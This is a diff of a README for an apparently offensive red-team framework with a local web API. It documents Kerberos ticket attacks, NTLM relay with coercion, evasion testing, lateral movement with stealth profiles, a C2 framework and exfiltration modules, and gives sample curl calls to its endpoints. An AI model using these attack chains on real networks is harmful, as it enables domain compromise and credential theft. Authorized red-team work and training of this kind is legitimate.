@@ -2,21 +2,266 @@
 
 > ⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational and red team training purposes. **DO NOT deploy in production environments.**
 
-## Production Başlatma (Senior Seviye)
-
-Uygulamayı production-ready şekilde başlatmak için:
+## 🚀 Quick Start
 
 ```bash
+# Start production server
 make run-prod
-```
 
-veya doğrudan:
-
-```bash
+# Or directly:
 PYTHONPATH=. .venv/bin/gunicorn -w 4 -b 0.0.0.0:8080 wsgi:app
 ```
 
-Bu şekilde uygulama, 4 worker ile 8080 portunda production-ready olarak çalışır.
+Access the UI at `http://localhost:8080`
+
+---
+
+## 📦 Feature Overview
+
+| Module | Description | UI Page |
+|--------|-------------|---------|
+| **Kerberos Attack Chain** | AS-REP, Kerberoast, OPTH, Golden/Silver Tickets | `/kerberos` |
+| **NTLM Relay** | LDAP/SMB/AD CS relay with coercion triggers | `/relay` |
+| **Evasion Testing** | YARA, strings, entropy, behavioral analysis | `/evasion` |
+| **Lateral Movement** | WMI/PSExec/DCOM with evasion profiles | `/lateral` |
+| **C2 Framework** | Beacon management with multi-language agents | `/c2` |
+| **Process Injection** | Shellcode injection with LOTL execution | `/payloads` |
+| **Attack Graph** | BloodHound-style path visualization | `/attack-graph` |
+
+---
+
+## 🎫 Kerberos Attack Chain
+
+Complete Kerberos attack automation from enumeration to domain dominance.
+
+### Features
+
+| Attack | Description | Impacket Tool |
+|--------|-------------|---------------|
+| **AS-REP Roasting** | Extract hashes from no-preauth users | `GetNPUsers.py` |
+| **Kerberoasting** | Request TGS for SPNs, crack offline | `GetUserSPNs.py` |
+| **Overpass-the-Hash** | Use NTLM hash to get TGT | `getTGT.py` |
+| **Silver Ticket** | Forge service tickets | `ticketer.py` |
+| **Golden Ticket** | Forge TGT with KRBTGT hash | `ticketer.py` |
+| **Full Chain** | Automated attack progression | All combined |
+
+### API Endpoints
+
+```bash
+# AS-REP Roasting
+curl -X POST http://localhost:8080/kerberos/asrep \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"corp.local","dc_ip":"192.168.1.1"}'
+
+# Kerberoasting
+curl -X POST http://localhost:8080/kerberos/kerberoast \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"corp.local","dc_ip":"192.168.1.1","username":"user","password":"pass"}'
+
+# Overpass-the-Hash
+curl -X POST http://localhost:8080/kerberos/opth \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"corp.local","dc_ip":"192.168.1.1","username":"admin","ntlm_hash":"aad3b435..."}'
+
+# Full Attack Chain
+curl -X POST http://localhost:8080/kerberos/chain \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"corp.local","dc_ip":"192.168.1.1","krbtgt_hash":"..."}'
+```
+
+### Attack Chain Flow
+
+```
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│ 1. ENUMERATION  │───▶│  2. ROASTING    │───▶│  3. PASS-THE-X  │
+│ • User enum     │    │ • AS-REP Roast  │    │ • Pass-the-Hash │
+│ • SPN enum      │    │ • Kerberoast    │    │ • OPTH          │
+│ • Delegation    │    │ • Crack offline │    │ • Pass-the-Ticket│
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+                                                       │
+                                                       ▼
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│ 6. PERSISTENCE  │◀───│ 5. GOLDEN TICKET│◀───│ 4. SILVER TICKET│
+│ • DCSync        │    │ • KRBTGT hash   │    │ • Service hash  │
+│ • Skeleton Key  │    │ • Domain Admin  │    │ • Service access│
+│ • SID History   │    │ • 10 year valid │    │ • Specific host │
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+```
+
+---
+
+## 🔄 NTLM Relay & Coercion
+
+NTLM relay attacks with multiple coercion triggers.
+
+### Coercion Methods
+
+| Method | Protocol | Description |
+|--------|----------|-------------|
+| **PetitPotam** | MS-EFSRPC | EFS encryption coercion (CVE-2021-36942) |
+| **PrinterBug** | MS-RPRN | Print Spooler coercion |
+| **DFSCoerce** | MS-DFSNM | DFS namespace coercion |
+| **ShadowCoerce** | MS-FSRVP | VSS agent coercion |
+
+### Relay Targets
+
+| Target | Attack | Description |
+|--------|--------|-------------|
+| **LDAP** | RBCD | Resource-Based Constrained Delegation |
+| **LDAP** | Shadow Credentials | Add msDS-KeyCredentialLink |
+| **SMB** | Secrets Dump | Extract SAM/LSA/NTDS |
+| **AD CS** | ESC8 | Request certificate for machine account |
+
+### API Endpoints
+
+```bash
+# Start LDAP Relay (RBCD Attack)
+curl -X POST http://localhost:8080/relay/start/ldap \
+  -H "Content-Type: application/json" \
+  -d '{"target_dc":"dc01.corp.local","attack":"rbcd","delegate_to":"EVILPC$"}'
+
+# Trigger PetitPotam
+curl -X POST http://localhost:8080/relay/coerce/petitpotam \
+  -H "Content-Type: application/json" \
+  -d '{"target":"dc01.corp.local","listener":"192.168.1.100"}'
+
+# Full RBCD Chain
+curl -X POST http://localhost:8080/relay/chain/rbcd \
+  -H "Content-Type: application/json" \
+  -d '{"coerce_target":"dc01","dc_target":"dc01","delegate_to":"EVILPC$","listener_ip":"192.168.1.100"}'
+
+# Check All Coercion Methods
+curl -X POST http://localhost:8080/relay/coerce/check \
+  -H "Content-Type: application/json" \
+  -d '{"target":"dc01.corp.local","listener":"192.168.1.100"}'
+```
+
+### Relay Attack Flow
+
+```
+┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+│  Attacker   │     │   Target    │     │    DC       │
+│  (Listener) │     │   (Coerce)  │     │   (Relay)   │
+└──────┬──────┘     └──────┬──────┘     └──────┬──────┘
+       │                   │                   │
+       │ 1. Start relay    │                   │
+       │◀──────────────────│                   │
+       │                   │                   │
+       │ 2. Trigger coerce │                   │
+       │──────────────────▶│                   │
+       │                   │                   │
+       │ 3. NTLM Auth      │                   │
+       │◀──────────────────│                   │
+       │                   │                   │
+       │ 4. Relay to DC    │                   │
+       │───────────────────│──────────────────▶│
+       │                   │                   │
+       │ 5. RBCD/Certs     │                   │
+       │◀──────────────────│───────────────────│
+       │                   │                   │
+```
+
+---
+
+## 🛡️ Evasion Testing Suite
+
+Static and behavioral analysis for payload evasion validation.
+
+### Features
+
+| Scanner | Description |
+|---------|-------------|
+| **YARA** | Built-in rules for malware patterns |
+| **Strings** | Suspicious string detection (APIs, crypto) |
+| **Entropy** | Packed/encrypted payload detection |
+| **Behavioral** | API call pattern analysis |
+
+### Risk Levels
+
+| Level | Score | Description |
+|-------|-------|-------------|
+| CLEAN | 0 | No detection indicators |
+| LOW | 1-29 | Minor suspicious patterns |
+| MEDIUM | 30-59 | Some malware indicators |
+| HIGH | 60-99 | Likely malicious |
+| CRITICAL | 100+ | Known malware signatures |
+
+### API Endpoints
+
+```bash
+# Test File
+curl -X POST http://localhost:8080/evasion/test/file \
+  -F "file=@payload.exe"
+
+# Test Code Pattern
+curl -X POST http://localhost:8080/evasion/test/code \
+  -H "Content-Type: application/json" \
+  -d '{"code":"import ctypes\nctypes.windll.kernel32.VirtualAlloc...","language":"python"}'
+
+# YARA Scan
+curl -X POST http://localhost:8080/evasion/yara \
+  -H "Content-Type: application/json" \
+  -d '{"data":"TVqQAAMAAAA..."}'  # Base64 encoded
+
+# Entropy Analysis
+curl -X POST http://localhost:8080/evasion/entropy \
+  -H "Content-Type: application/json" \
+  -d '{"data":"<base64>"}'
+```
+
+### Built-in YARA Rules
+
+- `shellcode_patterns` - Shellcode indicators (NOP sleds, syscall stubs)
+- `pe_injection` - PE injection techniques
+- `suspicious_api` - Malicious API patterns
+- `obfuscation_detect` - Obfuscation indicators
+- `crypto_patterns` - Encryption markers
+- `c2_indicators` - C2 communication patterns
+
+---
+
+## 🔀 Lateral Movement
+
+Impacket-based lateral movement with credential harvesting.
+
+### Execution Methods
+
+| Method | Tool | Description |
+|--------|------|-------------|
+| **WMIExec** | `wmiexec.py` | WMI-based execution |
+| **PSExec** | `psexec.py` | Service-based execution |
+| **SMBExec** | `smbexec.py` | SMB-based execution |
+| **DCOMExec** | `dcomexec.py` | DCOM-based execution |
+| **AtExec** | `atexec.py` | Task scheduler execution |
+
+### Evasion Profiles
+
+| Profile | Detection Risk | Speed | Use Case |
+|---------|---------------|-------|----------|
+| **None** | HIGH | Fastest | Quick lab testing |
+| **Default** | MEDIUM | Fast | Basic bypass |
+| **Stealth** | LOW | Medium | Production targets |
+| **Paranoid** | MINIMAL | Slowest | High-security environments |
+| **Aggressive** | MEDIUM | Fast | Time-critical operations |
+
+### API Endpoints
+
+```bash
+# Quick Jump (Single Target)
+curl -X POST http://localhost:8080/lateral/quick-jump \
+  -H "Content-Type: application/json" \
+  -d '{"target":"192.168.1.50","method":"wmiexec","domain":"CORP","username":"admin","password":"pass"}'
+
+# Chain Attack (Multi-hop)
+curl -X POST http://localhost:8080/lateral/chain \
+  -H "Content-Type: application/json" \
+  -d '{"initial":"192.168.1.10","targets":["192.168.1.20","192.168.1.30"],"domain":"CORP","username":"admin"}'
+
+# Credential Dump
+curl -X POST http://localhost:8080/lateral/dump \
+  -H "Content-Type: application/json" \
+  -d '{"target":"192.168.1.10","method":"secretsdump"}'
+```
 
 ---
 
@@ -653,3 +898,63 @@ alembic upgrade head
 ```
 python3 -m unittest discover -s tests
 ```
+
+---
+
+## 📊 Module Summary
+
+### Core Modules (`cybermodules/`)
+
+| Module | Lines | Description |
+|--------|-------|-------------|
+| `kerberos_chain.py` | ~900 | Kerberos attack chain automation |
+| `ntlm_relay.py` | ~750 | NTLM relay and coercion |
+| `evasion_testing.py` | ~700 | Static/behavioral analysis |
+| `lateral_movement.py` | ~600 | Lateral movement execution |
+| `process_injection.py` | ~500 | Shellcode injection techniques |
+| `lotl_execution.py` | ~400 | Living off the land execution |
+| `indirect_syscalls.py` | ~350 | Syscall evasion |
+| `multi_layer_obfuscation.py` | ~300 | Code obfuscation |
+| `persistence.py` | ~400 | Persistence mechanisms |
+| `loot_exfil.py` | ~300 | Data exfiltration |
+| `full_chain_orchestrator.py` | ~500 | Kill chain automation |
+
+### Evasion Modules (`evasion/`)
+
+| Module | Description |
+|--------|-------------|
+| `amsi_bypass.py` | AMSI bypass techniques |
+| `sleep_masking.py` | Sleep obfuscation |
+| `process_injection.py` | Advanced injection |
+| `indirect_syscalls.py` | Hell's Gate / Halo's Gate |
+| `reflective_loader.py` | sRDI / Donut loader |
+| `c2_profiles.py` | Malleable C2 profiles |
+| `fallback_channels.py` | DNS/WebSocket/ICMP |
+| `go_agent.py` | Go agent generator |
+| `rust_agent.py` | Rust agent generator |
+
+### API Routes (`cyberapp/routes/`)
+
+| Route | Endpoints | Description |
+|-------|-----------|-------------|
+| `kerberos.py` | 11 | Kerberos attacks |
+| `relay.py` | 15 | NTLM relay |
+| `evasion.py` | 12 | Evasion testing |
+| `lateral.py` | 10 | Lateral movement |
+| `c2_beacon.py` | 8 | C2 beacon management |
+
+---
+
+## 🔒 Legal Disclaimer
+
+This software is provided for **authorized security testing and educational purposes only**. 
+
+Usage of this tool against systems without explicit permission is **illegal** and unethical.
+
+The authors are not responsible for any misuse or damage caused by this software.
+
+---
+
+## 📜 License
+
+MIT License - See [LICENSE](LICENSE) for details.
